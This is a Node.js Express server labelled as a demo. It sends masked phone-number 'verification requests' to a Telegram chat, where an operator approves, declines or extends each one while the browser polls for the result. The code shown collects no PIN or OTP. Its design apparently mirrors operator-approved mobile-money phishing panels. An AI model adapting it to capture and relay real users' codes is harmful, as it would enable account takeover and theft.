'use strict';

const express = require('express');
const axios = require('axios');
const crypto = require('crypto');

const app = express();

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const TELEGRAM_API = TELEGRAM_BOT_TOKEN
  ? `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`
  : null;

const REQUEST_TTL_MS = 5 * 60 * 1000;
const POLL_TIMEOUT_MS = 25_000;
const requests = new Map();

app.disable('x-powered-by');
app.use(express.json({ limit: '10kb' }));
app.use(express.static(__dirname, { index: 'index.html' }));

// Mask phone numbers in Telegram notifications.
function maskPhone(phone) {
  return phone.length > 4
    ? `${phone.slice(0, 2)}••••${phone.slice(-2)}`
    : '••••';
}

// Display timestamps in East Africa Time.
function nowEastAfrica() {
  return new Intl.DateTimeFormat('en-GB', {
    timeZone: 'Africa/Nairobi',
    dateStyle: 'medium',
    timeStyle: 'short'
  }).format(new Date());
}

function telegramConfigured() {
  return Boolean(TELEGRAM_API && TELEGRAM_CHAT_ID);
}

async function telegramPost(method, payload) {
  if (!telegramConfigured()) {
    throw new Error('Telegram is not configured.');
  }

  const response = await axios.post(
    `${TELEGRAM_API}/${method}`,
    payload,
    { timeout: 10_000 }
  );

  if (!response.data || !response.data.ok) {
    throw new Error(`Telegram API error: ${method}`);
  }

  return response.data.result;
}

// Create a demo verification request.
// Only a masked phone number and a fixed demo label are sent to Telegram.
app.post('/api/requests', async (req, res) => {
  const phone = String(req.body?.phone || '').replace(/\D/g, '');
  const hasFiveDigits = req.body?.hasFiveDigits === true;

  if (!/^\d{9}$/.test(phone)) {
    return res.status(400).json({
      success: false,
      message: 'Enter a valid 9-digit demo phone number.'
    });
  }

  if (!hasFiveDigits) {
    return res.status(400).json({
      success: false,
      message: 'Complete the demo verification step.'
    });
  }

  if (!telegramConfigured()) {
    return res.status(503).json({
      success: false,
      message: 'Telegram approval is not configured.'
    });
  }

  const id = crypto.randomUUID();

  const request = {
    id,
    phone,
    status: 'pending',
    createdAt: Date.now(),
    telegramMessageId: null
  };

  requests.set(id, request);

  const text = [
    '🔐 DEMO VERIFICATION',
    '',
    `Request ID: ${id}`,
    `Phone: ${maskPhone(phone)}`,
    `Time: ${nowEastAfrica()}`,
    'Demo code: 00000 (fixed test value)',
    '',
    'This is a demo request. No entered PIN or OTP is collected or transmitted.'
  ].join('\n');

  // Updated layout: two side-by-side buttons and one below.
  const replyMarkup = {
    inline_keyboard: [
      [
        {
          text: '✅ Approve',
          callback_data: `approve:${id}`
        },
        {
          text: '❌ Decline',
          callback_data: `decline:${id}`
        }
      ],
      [
        {
          text: '⏱ Extend Time',
          callback_data: `extend:${id}`
        }
      ]
    ]
  };

  try {
    const sent = await telegramPost('sendMessage', {
      chat_id: TELEGRAM_CHAT_ID,
      text,
      reply_markup: replyMarkup
    });

    request.telegramMessageId = sent.message_id;

    return res.json({
      success: true,
      requestId: id,
      status: request.status
    });
  } catch (error) {
    requests.delete(id);

    console.error('Telegram notification failed:', error.message);

    return res.status(502).json({
      success: false,
      message: 'Could not send the demo notification. Please try again.'
    });
  }
});

// Let the browser check the demo approval status.
app.get('/api/requests/:id', (req, res) => {
  res.set('Cache-Control', 'no-store');

  const request = requests.get(req.params.id);

  if (!request || Date.now() - request.createdAt > REQUEST_TTL_MS) {
    if (request) requests.delete(req.params.id);

    return res.status(404).json({
      success: false,
      status: 'expired',
      message: 'This demo request has expired.'
    });
  }

  return res.json({
    success: true,
    status: request.status
  });
});

// Acknowledge a Telegram button press.
async function answerCallback(callbackId, text) {
  try {
    await telegramPost('answerCallbackQuery', {
      callback_query_id: callbackId,
      text
    });
  } catch (error) {
    console.error('Callback response failed:', error.message);
  }
}

// Handle Approve, Decline, and Extend Time.
async function handleCallback(callback) {
  const message = callback.message;

  if (
    !message ||
    String(message.chat.id) !== String(TELEGRAM_CHAT_ID)
  ) {
    return answerCallback(callback.id, 'Not authorized.');
  }

  const match = String(callback.data || '').match(
    /^(approve|decline|extend):([a-f0-9-]+)$/i
  );

  if (!match) {
    return answerCallback(callback.id, 'Invalid action.');
  }

  const action = match[1].toLowerCase();
  const id = match[2];
  const request = requests.get(id);

  if (!request) {
    return answerCallback(callback.id, 'Request not found or expired.');
  }

  if (Date.now() - request.createdAt > REQUEST_TTL_MS) {
    requests.delete(id);
    return answerCallback(callback.id, 'This request has expired.');
  }

  if (action === 'extend') {
    if (request.status !== 'pending') {
      return answerCallback(callback.id, 'This request is already finished.');
    }

    request.createdAt = Date.now();

    await answerCallback(callback.id, 'Demo request extended by 5 minutes.');

    return;
  }

  if (request.status !== 'pending') {
    return answerCallback(
      callback.id,
      `Already ${request.status}.`
    );
  }

  request.status = action === 'approve' ? 'approved' : 'declined';

  await answerCallback(
    callback.id,
    action === 'approve'
      ? 'Demo request approved.'
      : 'Demo request declined.'
  );

  // Remove buttons after a final decision.
  try {
    await telegramPost('editMessageReplyMarkup', {
      chat_id: TELEGRAM_CHAT_ID,
      message_id: message.message_id,
      reply_markup: { inline_keyboard: [] }
    });
  } catch (error) {
    console.error('Could not update Telegram buttons:', error.message);
  }

  // Send a separate, clear decision message.
  try {
    await telegramPost('sendMessage', {
      chat_id: TELEGRAM_CHAT_ID,
      text: `${action === 'approve' ? '✅' : '❌'} Demo request ${action.toUpperCase()}\nRequest ID: ${id}`
    });
  } catch (error) {
    console.error('Could not send decision message:', error.message);
  }
}

// Poll Telegram for inline button callbacks.
async function pollTelegram() {
  if (!telegramConfigured()) {
    console.log(
      'Telegram is not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.'
    );
    return;
  }

  let offset = 0;

  console.log('Telegram demo approval polling started.');

  while (true) {
    try {
      const response = await axios.get(
        `${TELEGRAM_API}/getUpdates`,
        {
          params: {
            offset,
            timeout: 25,
            allowed_updates: JSON.stringify(['callback_query'])
          },
          timeout: POLL_TIMEOUT_MS + 10_000
        }
      );

      if (!response.data?.ok) {
        throw new Error('Telegram getUpdates returned an error.');
      }

      for (const update of response.data.result || []) {
        offset = update.update_id + 1;

        if (update.callback_query) {
          await handleCallback(update.callback_query);
        }
      }
    } catch (error) {
      console.error(
        'Telegram polling error:',
        error.response?.data || error.message
      );

      await new Promise(resolve => setTimeout(resolve, 3000));
    }
  }
}

// Remove expired requests periodically.
setInterval(() => {
  const cutoff = Date.now() - REQUEST_TTL_MS;

  for (const [id, request] of requests.entries()) {
    if (request.createdAt < cutoff) {
      requests.delete(id);
    }
  }
}, 60_000);

// Start the web server.
app.listen(PORT, () => {
  console.log(`Demo verification app running on port ${PORT}`);
  pollTelegram();
});
